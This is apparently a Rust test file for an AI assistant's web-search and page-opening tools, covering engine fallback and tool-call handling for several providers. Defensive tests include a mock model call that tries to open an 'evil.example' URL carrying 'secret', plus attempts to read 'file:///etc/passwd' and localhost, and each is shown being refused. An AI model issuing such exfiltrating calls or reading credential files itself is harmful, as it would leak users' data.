use std::cell::RefCell;

use super::*;
use crate::features::ask_ai::{Pending, Reply, anthropic, mock, openai};
use crate::shared::config::Provider;

fn hit(n: &str) -> Hit {
    Hit {
        title: format!("Page {n}"),
        url: format!("https://example.org/{n}"),
        snippet: String::new(),
    }
}

const fn engine(name: &'static str, url: fn(&str) -> String) -> Engine {
    Engine {
        name,
        url,
        parse: |_, body| match body {
            "results" => vec![hit("1"), hit("2")],
            _ => Vec::new(),
        },
    }
}

/// A captcha page or a 429 rests that engine (it is not asked again) and the
/// next one answers; nothing answers = `None`.
#[test]
fn a_blocked_engine_rests_and_the_next_answers() {
    let engines = [
        engine("test-captcha", |_| "https://a/".into()),
        engine("test-429", |_| "https://b/".into()),
        engine("test-ok", |_| "https://c/".into()),
    ];
    let asked = RefCell::new(Vec::new());
    let get = |url: &str| {
        asked.borrow_mut().push(url.to_string());
        Ok(match url {
            "https://a/" => (200, "<p>Please solve this CAPTCHA</p>".to_string()),
            "https://b/" => (429, String::new()),
            _ => (200, "results".to_string()),
        })
    };
    assert_eq!(
        search_with(&engines, "q", get),
        Some(vec![hit("1"), hit("2")])
    );
    assert_eq!(
        search_with(&engines, "q", get),
        Some(vec![hit("1"), hit("2")])
    );
    assert_eq!(
        *asked.borrow(),
        ["https://a/", "https://b/", "https://c/", "https://c/"],
        "the blocked engines rest"
    );
    let down = [engine("test-down", |_| "https://d/".into())];
    assert_eq!(search_with(&down, "q", |_| Err("offline".into())), None);
    // a page without results is not a block: asked again next time
    let empty = [engine("test-empty", |_| "https://e/".into())];
    assert_eq!(search_with(&empty, "q", |_| Ok((200, "none".into()))), None);
    assert_eq!(
        search_with(&empty, "q", |_| Ok((200, "results".into()))).map(|h| h.len()),
        Some(2)
    );
}

fn call(id: &str, name: &str, args: &str) -> String {
    let args = serde_json::to_string(args).unwrap();
    format!(
        "data: {{\"choices\":[{{\"index\":0,\"delta\":{{\"tool_calls\":[{{\"index\":0,\"id\":\"{id}\",\"type\":\"function\",\"function\":{{\"name\":\"{name}\",\"arguments\":{args}}}}}]}}}}]}}\n\n\
         data: {{\"choices\":[{{\"index\":0,\"delta\":{{}},\"finish_reason\":\"tool_calls\"}}]}}\n\ndata: [DONE]\n\n"
    )
}

fn text(t: &str) -> String {
    format!(
        "data: {{\"choices\":[{{\"index\":0,\"delta\":{{\"content\":\"{t}\"}}}}]}}\n\ndata: [DONE]\n\n"
    )
}

fn cfg(url: String) -> AiConfig {
    AiConfig {
        provider: Provider::OpenaiCompatible,
        base_url: url,
        model: "m".into(),
        ..AiConfig::default()
    }
}

/// The model searches, opens a result, is refused a URL it made up, then
/// answers; the chat gets the sources. Only the search words leave.
#[test]
fn the_model_searches_opens_a_result_and_answers() {
    let (url, heads) = mock::serve(vec![
        mock::stream(&call("c1", "web_search", r#"{"query":"rust 2026"}"#)),
        mock::stream(&call(
            "c2",
            "open_page",
            r#"{"url":"https://example.org/1"}"#,
        )),
        mock::stream(&call(
            "c3",
            "open_page",
            r#"{"url":"https://evil.example/?q=secret"}"#,
        )),
        mock::stream(&text("Done [1]")),
    ]);
    let (searched, opened, web) = (
        RefCell::new(vec![]),
        RefCell::new(vec![]),
        RefCell::new(vec![]),
    );
    let mut answer_text = String::new();
    let question = [Message::user("What's new in Rust?").with_image(b"png".to_vec())];
    answer(
        &cfg(url),
        None,
        &question,
        |p| {
            answer_text.push_str(p);
            ControlFlow::Continue(())
        },
        |w| web.borrow_mut().push(w),
        |q| {
            searched.borrow_mut().push(q.to_string());
            Some(vec![hit("1")])
        },
        |u| {
            opened.borrow_mut().push(u.to_string());
            Ok("page text".into())
        },
    )
    .unwrap();
    assert_eq!(answer_text, "Done [1]");
    assert_eq!(*searched.borrow(), ["rust 2026"]);
    assert_eq!(
        *opened.borrow(),
        ["https://example.org/1"],
        "the made-up URL is refused"
    );
    assert_eq!(*web.borrow(), [Web::Sources(vec![hit("1")])]);
    assert_eq!(heads.try_iter().count(), 4);
}

/// A server that refuses tools (a model without tool calling): one search
/// with the question, its results go with it; search down = the note.
#[test]
fn a_model_without_tools_gets_one_search_with_the_question() {
    for (found, want) in [
        (Some(vec![hit("1")]), Web::Sources(vec![hit("1")])),
        (None, Web::Unavailable),
    ] {
        let (url, _) = mock::serve(vec![
            mock::reply(
                404,
                r#"{"error":{"message":"No endpoints found that support tool use"}}"#,
            ),
            mock::stream(&text("Answer")),
        ]);
        let (searched, web) = (RefCell::new(vec![]), RefCell::new(vec![]));
        answer(
            &cfg(url),
            None,
            &[Message::user("weather tomorrow")],
            |_| ControlFlow::Continue(()),
            |w| web.borrow_mut().push(w),
            |q| {
                searched.borrow_mut().push(q.to_string());
                found.clone()
            },
            |_| unreachable!("no page without tools"),
        )
        .unwrap();
        assert_eq!(*searched.borrow(), ["weather tomorrow"]);
        assert_eq!(*web.borrow(), [want]);
    }
}

/// Gemini (OpenAI-compatible): a thinking model's tool call carries
/// `extra_content.google.thought_signature`; the next round must send it back
/// unchanged, or Google answers HTTP 400 (owner, 2026-11-18).
#[test]
fn gemini_gets_its_thought_signature_back() {
    let signed = r#"data: {"choices":[{"index":0,"delta":{"role":"assistant","tool_calls":[{"extra_content":{"google":{"thought_signature":"SIG=="}},"function":{"arguments":"{\"query\":\"amer\"}","name":"web_search"},"id":"g1","type":"function"}]},"finish_reason":"tool_calls"}]}

data: [DONE]

"#;
    let (url, seen) = mock::serve(vec![mock::stream(signed), mock::stream(&text("Found"))]);
    let mut got = String::new();
    answer(
        &cfg(url),
        None,
        &[Message::user("look for amer")],
        |p| {
            got.push_str(p);
            ControlFlow::Continue(())
        },
        |_| {},
        |_| Some(vec![hit("1")]),
        |_| Err("no".into()),
    )
    .unwrap();
    assert_eq!(got, "Found");
    let second = seen.try_iter().nth(1).unwrap();
    let body: Value = serde_json::from_str(second.split("\r\n\r\n").nth(1).unwrap()).unwrap();
    let echoed = &body["messages"]
        .as_array()
        .unwrap()
        .iter()
        .rev()
        .nth(1)
        .unwrap()["tool_calls"][0];
    assert_eq!(
        echoed["extra_content"],
        json!({"google": {"thought_signature": "SIG=="}})
    );
    assert_eq!(echoed["id"], "g1");
}

/// A provider that still refuses a later tool round (HTTP 400) gets the
/// no-tools path once (one search with the question), not an error card.
#[test]
fn a_refused_tool_round_falls_back_to_one_search() {
    let (url, _) = mock::serve(vec![
        mock::stream(&call("c1", "web_search", r#"{"query":"x"}"#)),
        mock::reply(
            400,
            r#"{"error":{"message":"Function call is missing a thought_signature"}}"#,
        ),
        mock::stream(&text("Answer")),
    ]);
    let (searched, mut got) = (RefCell::new(vec![]), String::new());
    answer(
        &cfg(url),
        None,
        &[Message::user("look for amer")],
        |p| {
            got.push_str(p);
            ControlFlow::Continue(())
        },
        |_| {},
        |q| {
            searched.borrow_mut().push(q.to_string());
            Some(vec![hit("1")])
        },
        |_| Err("no".into()),
    )
    .unwrap();
    assert_eq!(got, "Answer");
    assert_eq!(*searched.borrow(), ["x", "look for amer"]);
}

#[test]
fn the_user_s_own_links_may_be_opened() {
    assert_eq!(
        links("Summarize (https://example.org/a), not file:///etc/passwd or ftp://x"),
        ["https://example.org/a"]
    );
}

/// OpenAI: the assistant turn with its calls, then one `tool` message per result.
#[test]
fn openai_sends_tool_turns_back_in_its_format() {
    let mut pending = Pending::default();
    for line in call("c1", "web_search", r#"{"query":"x"}"#)
        .lines()
        .filter_map(|l| l.strip_prefix("data: "))
    {
        openai::parse_into(line, &mut pending).unwrap();
    }
    let Reply { calls, native, .. } = openai::reply(String::new(), pending);
    assert_eq!(
        (
            calls[0].id.as_str(),
            calls[0].name.as_str(),
            calls[0].args.as_str()
        ),
        ("c1", "web_search", r#"{"query":"x"}"#)
    );
    let mut called = Message::new(Role::Assistant, "");
    called.native = native;
    let mut back = Message::user("");
    back.results = vec![("c1".into(), "results".into())];
    let req = openai::build_request(
        &cfg("https://x/v1".into()),
        None,
        &[Message::user("q"), called, back],
        None,
    )
    .unwrap();
    let msgs = &req.body["messages"];
    assert_eq!(msgs[1]["tool_calls"][0]["function"]["name"], "web_search");
    assert_eq!(msgs[1]["content"], Value::Null);
    assert_eq!(
        msgs[2],
        json!({"role": "tool", "tool_call_id": "c1", "content": "results"})
    );
}

/// Anthropic: every block of the assistant turn goes back as it came (the
/// thinking block with its signature), all results in one user message.
#[test]
fn anthropic_sends_thinking_and_tool_use_back_unchanged() {
    let events = [
        r#"{"type":"content_block_start","index":0,"content_block":{"type":"thinking","thinking":"","signature":""}}"#,
        r#"{"type":"content_block_delta","index":0,"delta":{"type":"thinking_delta","thinking":"Let me search"}}"#,
        r#"{"type":"content_block_delta","index":0,"delta":{"type":"signature_delta","signature":"SIG"}}"#,
        r#"{"type":"content_block_stop","index":0}"#,
        r#"{"type":"content_block_start","index":1,"content_block":{"type":"tool_use","id":"t1","name":"web_search","input":{}}}"#,
        r#"{"type":"content_block_delta","index":1,"delta":{"type":"input_json_delta","partial_json":"{\"query\":"}}"#,
        r#"{"type":"content_block_delta","index":1,"delta":{"type":"input_json_delta","partial_json":"\"x\"}"}}"#,
        r#"{"type":"content_block_stop","index":1}"#,
        r#"{"type":"content_block_start","index":2,"content_block":{"type":"tool_use","id":"t2","name":"web_search","input":{}}}"#,
        r#"{"type":"content_block_stop","index":2}"#,
    ];
    let mut pending = Pending::default();
    for e in events {
        anthropic::parse_into(e, &mut pending).unwrap();
    }
    let Reply { calls, native, .. } = anthropic::reply(String::new(), pending);
    assert_eq!(calls.len(), 2);
    assert_eq!(calls[0].args, r#"{"query":"x"}"#);
    let blocks = native.clone().unwrap();
    assert_eq!(
        blocks[0],
        json!({"type": "thinking", "thinking": "Let me search", "signature": "SIG"})
    );
    assert_eq!(
        blocks[1],
        json!({"type": "tool_use", "id": "t1", "name": "web_search", "input": {"query": "x"}})
    );
    assert_eq!(blocks[2]["input"], json!({}));
    let mut called = Message::new(Role::Assistant, "");
    called.native = native;
    let mut back = Message::user("");
    back.results = vec![("t1".into(), "a".into()), ("t2".into(), "b".into())];
    let key = crate::shared::secrets::Secret::new("sk-ant-FAKE");
    let req = anthropic::build_request(
        &AiConfig::default(),
        Some(&key),
        &[Message::user("q"), called, back],
        None,
    )
    .unwrap();
    let msgs = req.body["messages"].as_array().unwrap();
    assert_eq!(msgs.len(), 3);
    assert_eq!(msgs[1]["content"], blocks);
    assert_eq!(
        msgs[2]["content"][1],
        json!({"type": "tool_result", "tool_use_id": "t2", "content": "b"})
    );
}

#[test]
fn page_text_drops_scripts_and_tags() {
    let html = "<html><head><title>T</title><style>p{}</style></head><body><script>x=1<2</script>\
                <h1>Title &amp; more</h1><p>One&nbsp;two&#33;</p><div>three<br>four</div></body></html>";
    assert_eq!(page::text_of(html), "Title & more\nOne two!\nthree\nfour");
    assert!(page::open("file:///etc/passwd").is_err());
}

/// The real engines and a real page, from this PC (network; by hand:
/// `cargo test live_search -- --ignored --nocapture`).
#[test]
#[ignore]
fn live_search_and_page() {
    for q in ["ubuntu 22.04 end of life", "عاصمة اليابان"] {
        let hits = search(q).expect("an engine answers");
        println!("{q}: {} hits, first {:?}", hits.len(), hits[0]);
        assert!(hits.iter().all(|h| h.url.starts_with("https://")));
    }
    let wiki = search_with(&ENGINES[1..], "Rust programming language", |u| {
        let agent = crate::shared::net::agent(crate::shared::net::WEB);
        let mut r = agent.get(u).call().map_err(|e| e.to_string())?;
        let body = r.body_mut().read_to_string().map_err(|e| e.to_string())?;
        Ok((r.status().as_u16(), body))
    })
    .expect("Wikipedia answers");
    let text = page::open(&wiki[0].url).expect("the page opens");
    let head: String = text.chars().take(200).collect();
    println!("{} -> {} chars: {head}", wiki[0].url, text.len());
    assert!(text.len() > 500);
    assert!(page::open("http://127.0.0.1/").is_err());
}
